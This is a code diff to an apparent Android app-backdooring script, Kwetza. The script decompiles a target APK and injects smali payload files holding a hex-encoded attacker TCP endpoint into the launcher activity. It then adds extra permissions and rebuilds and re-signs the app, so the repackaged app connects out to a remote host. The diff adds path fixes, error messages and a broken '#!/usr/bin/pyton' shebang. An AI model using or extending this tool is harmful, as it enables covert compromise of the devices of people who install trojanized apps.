@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/pyton
 import subprocess
 import sys
 import os
@@ -9,10 +9,15 @@ targetFolder=""
 endpointIP=""
 endpintPort=""
 hexEndpoint=""
+facepalm=""
+cwd=""
 
 def byteTheComms():
 	print "[*] BYTING COMMS..."
 	totalEndpointPlain="ZZZZtcp://"+endpointIP+":"+endpintPort
+	endpointLength=len(totalEndpointPlain)
+	global facepalm
+	facepalm=hex(endpointLength)
 	global hexEndpoint
 	for val in totalEndpointPlain:
 		hexEndpoint+=hex(ord(val))+"\n\t\t"
@@ -27,16 +32,20 @@ def initialize():
 	global endpointIP
 	endpointIP=sys.argv[2]
 	endpintPort=sys.argv[3]
+	global cwd
 
 	print "[+] ENDPOINT IP: "+endpointIP
 	print "[+] ENDPOINT PORT: "+endpintPort
 
 	#CHECK IF APKTOOL IS INSTALLED
 	if "2." not in theResult:
-		print "[+] NO APKTOOL, PLEASE INSTALL TO PATH"
+		print "[+] NO APKTOOL VERSION 2, PLEASE INSTALL APKTOOL 2 AND ADD TO PATH"
+		sys.exit()
+
+	cwd = os.getcwd()
 
 	#NOW WE NEED TO DECOMPILE THE APPLICATION
-	command = ["apktool", "d", sys.argv[1]]
+	command = ["apktool", "d", ""+cwd+"/"+sys.argv[1]]
 	p = subprocess.Popen(command, stdout=subprocess.PIPE)
 	result = p.communicate()[0]
 
@@ -48,7 +57,7 @@ def initialize():
 	outputFolderName=sys.argv[1]
 	intPoss=outputFolderName.index(".")
 	global targetFolder
-	targetFolder=outputFolderName[:intPoss]
+	targetFolder=cwd+"/"+outputFolderName[:intPoss]
 
 def parseAndroidManifext():
 	print "[*] ANALYZING ANDROID MANIFEST"
@@ -76,8 +85,9 @@ def parseAndroidManifext():
 		print "[+] NO LAUNCHER FOUND!!!!!"
 
 def readPayloads():
-	pathToPalyoad1="payload/AssistActivity1.smali"
-	pathToPalyoad12="payload/AssistActivity.smali"
+	global cwd
+	pathToPalyoad1=cwd+"/"+"payload/AssistActivity1.smali"
+	pathToPalyoad12=cwd+"/"+"payload/AssistActivity.smali"
 	contentsOfFile1 = open(pathToPalyoad1).read()
 	contentsOfFile2 = open(pathToPalyoad12).read()
 	inject="L"+activityToTarget.replace('.','/')
@@ -85,6 +95,7 @@ def readPayloads():
 	preppedContents1= contentsOfFile1.replace('PLACEHOLDER',inject[:intPackagePos])
 	preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos])
 	#inject the tcp endpoint here
+	preppedContents2= preppedContents2.replace('FACEPALM',facepalm)
 	preppedContents2= preppedContents2.replace('BEARDEDGREATNESS',hexEndpoint)
 	targetDirectory=targetFolder+"/smali/"+activityToTarget.replace('.','/')
 	targetDirectory=targetDirectory[:targetDirectory.rfind('/')]
@@ -134,7 +145,7 @@ def buildAgain():
 	#the apktool command to rebuild our target app
 	stringApkToolBuildCommand= ["apktool","b",targetFolder]
 	#jarsigner command to sign our freshly built apk
-	stringJarSignerCommand=["jarsigner", "-keystore", "payload/mykey.keystore", pathToNewApk, "alias_name", "-sigalg", "MD5withRSA", "-digestalg", "SHA1"]
+	stringJarSignerCommand=["jarsigner", "-keystore", cwd+"/"+"payload/mykey.keystore", pathToNewApk, "alias_name", "-sigalg", "MD5withRSA", "-digestalg", "SHA1"]
 	#time to execute the build command
 	print "[*] EXECUTING APKTOOL BUILD COMMAND..."
 	p = subprocess.Popen(stringApkToolBuildCommand, stdout=subprocess.PIPE)
@@ -200,36 +211,43 @@ if __name__ == "__main__":
 	print "[+] MMMMMMMM KWETZA";
 	try:
 		initialize()
-	except:
-		print "!!!! ERROR IN initialize"
+	except Exception as e:
+		print "!!!! ERROR IN 'initialize' method"
+		print str(e)
 		sys.exit()
 	try:
 		byteTheComms()
-	except:
-		print "!!! ERROR IN byteTheComms"
+	except Exception as e:
+		print "!!! ERROR IN 'byteTheComms' method"
+		print str(e)
 		sys.exit()
 	try:
 		parseAndroidManifext()
-	except:
-		print "!!! ERROR IN parseAndroidManifext"
+	except Exception as e:
+		print "!!! ERROR IN 'parseAndroidManifext' method"
+		print str(e)
 		sys.exit()
 	try:
 		readPayloads()
-	except:
-		print "!!! ERROR IN readPayloads"
+	except Exception as e:
+		print "!!! ERROR IN 'readPayloads' method"
+		print str(e)
 		sys.exit()
 	try:
 		injectIntoActivity()
-	except:
-		print "!!! ERROR IN injectIntoActivity"
+	except Exception as e:
+		print "!!! ERROR IN 'injectIntoActivity' method"
+		print str(e)
 		sys.exit()
 	try:
 		injectCrazyPermissions()
-	except:
-		print "!!! ERROR IN injectCrazyPermissions"
+	except Exception as e:
+		print "!!! ERROR IN 'injectCrazyPermissions' method"
+		print str(e)
 		sys.exit()
 	try:
 		buildAgain()
-	except:
-		print "!!! ERROR IN buildAgain"
+	except Exception as e:
+		print "!!! ERROR IN 'buildAgain' method"
+		print str(e)
 		sys.exit()
